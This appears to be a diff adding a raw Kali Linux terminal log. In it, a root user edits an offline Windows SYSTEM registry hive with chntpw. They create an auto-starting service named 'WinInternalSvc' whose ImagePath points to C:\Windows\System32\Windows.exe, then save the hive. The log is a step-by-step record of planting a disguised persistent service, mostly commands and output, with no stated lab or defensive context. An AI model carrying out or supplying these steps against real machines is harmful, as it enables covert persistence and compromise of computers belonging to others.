@@ -1,0 +1,148 @@
+sudo chntpw -e "/run/media/kali/BA6AF2446AF1FCC7/Windows/System32/config/SYSTEM"
+chntpw version 1.00 140201, (c) Petter N Hagen
+Hive </run/media/kali/BA6AF2446AF1FCC7/Windows/System32/config/SYSTEM> name (from header): <SYSTEM>
+ROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c <lh>
+File size 23068672 [1600000] bytes, containing 4475 pages (+ 1 headerpage)
+Used for data: 311029/22191480 blocks/bytes, unused: 187/615208 blocks/bytes.
+
+Simple registry editor. ? for help.
+
+> cd ControlSet001\Services\WinInternalSvc
+Key ControlSet001\Services\WinInternalSvc not found!
+
+> ls
+Node has 17 subkeys and 0 values
+  key name
+  <ActivationBroker>
+  <ControlSet001>
+  <DriverDatabase>
+  <HardwareConfig>
+  <Input>
+  <Keyboard Layout>
+  <Maps>
+  <MountedDevices>
+  <ResourceManager>
+  <ResourcePolicyStore>
+  <RNG>
+  <Select>
+  <Setup>
+  <Software>
+  <State>
+  <WaaS>
+  <WPA>
+
+> > cd ControlSet001
+> cd Services
+> lsUnknown command: > cd ControlSet001, type ? for help
+
+> Unknown command: > cd Services, type ? for help
+
+>cd ControlSet001
+Unknown command: > lcd ControlSet001, type ? for help
+
+> cd Services
+Key Services not found!
+
+> ls
+Node has 17 subkeys and 0 values
+  key name
+  <ActivationBroker>
+  <ControlSet001>
+  <DriverDatabase>
+  <HardwareConfig>
+  <Input>
+  <Keyboard Layout>
+  <Maps>
+  <MountedDevices>
+  <ResourceManager>
+  <ResourcePolicyStore>
+  <RNG>
+  <Select>
+  <Setup>
+  <Software>
+  <State>
+  <WaaS>
+  <WPA>
+
+> cd ControlSet001
+
+\ControlSet001> cd Services
+
+\ControlSet001\Services> newkey WinInternalSvc
+Unknown command: newkey WinInternalSvc, type ? for help
+
+\ControlSet001\Services> newkey WinInternalSvc
+Unknown command: newkey WinInternalSvc, type ? for help
+
+\ControlSet001\Services> ?
+Simple registry editor:
+hive [<n>]             - list loaded hives or switch to hive numer n
+cd <key>               - change current key
+ls | dir [<key>]       - show subkeys & values,
+cat | type <value>     - show key value
+dpi <value>            - show decoded DigitalProductId value
+hex <value>            - hexdump of value data
+ck [<keyname>]         - Show keys class data, if it has any
+nk <keyname>           - add key
+dk <keyname>           - delete key (must be empty)
+ed <value>             - Edit value
+nv <type#> <valuename> - Add value
+dv <valuename>         - Delete value
+delallv                - Delete all values in current key
+rdel <keyname>         - Recursively delete key & subkeys
+ek <filename> <prefix> <keyname>  - export key to <filename> (Windows .reg file format)
+debug                  - enter buffer hexeditor
+st [<hexaddr>]         - debug function: show struct info
+q                      - quit
+
+\ControlSet001\Services> nk WinInternalSvc
+
+\ControlSet001\Services> cd WinInternalSvc
+
+\ControlSet001\Services\WinInternalSvc> nv 4 Start
+
+\ControlSet001\Services\WinInternalSvc> 2
+Unknown command: 2, type ? for help
+
+\ControlSet001\Services\WinInternalSvc> nv 4 Type
+
+\ControlSet001\Services\WinInternalSvc> nv 1 ImagePath
+
+\ControlSet001\Services\WinInternalSvc> ed 4 Start
+Value <4 Start> not found!
+
+\ControlSet001\Services\WinInternalSvc> ed Start
+EDIT: <Start> of type REG_DWORD (4) with length 4 [0x4]
+DWORD: Old value 0 [0x0], enter new value (prepend 0x if hex, empty to keep old value)
+-> 2
+DWORD: New value 2 [0x2], 
+\ControlSet001\Services\WinInternalSvc> ed Type
+EDIT: <Type> of type REG_DWORD (4) with length 4 [0x4]
+DWORD: Old value 0 [0x0], enter new value (prepend 0x if hex, empty to keep old value)
+-> 16
+DWORD: New value 16 [0x10], 
+\ControlSet001\Services\WinInternalSvc> ed ImagePath
+EDIT: <ImagePath> of type REG_SZ (1) with length 0 [0x0]
+
+Now enter new strings, one by one.
+Enter nothing to keep old.
+[ 0]: [NEW]
+-> C:\Windows\System32\Windows.exe
+
+\ControlSet001\Services\WinInternalSvc> ls
+Node has 0 subkeys and 3 values
+  size     type              value name             [value if type DWORD]
+     4  4 REG_DWORD          <Start>                    2 [0x2]
+     4  4 REG_DWORD          <Type>                    16 [0x10]
+    64  1 REG_SZ             <ImagePath>
+
+\ControlSet001\Services\WinInternalSvc> q
+
+Hives that have changed:
+ #  Name
+ 0  </run/media/kali/BA6AF2446AF1FCC7/Windows/System32/config/SYSTEM>
+Write hive files? (y/n) [n] : y
+ 0  </run/media/kali/BA6AF2446AF1FCC7/Windows/System32/config/SYSTEM> - OK
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─#                                          
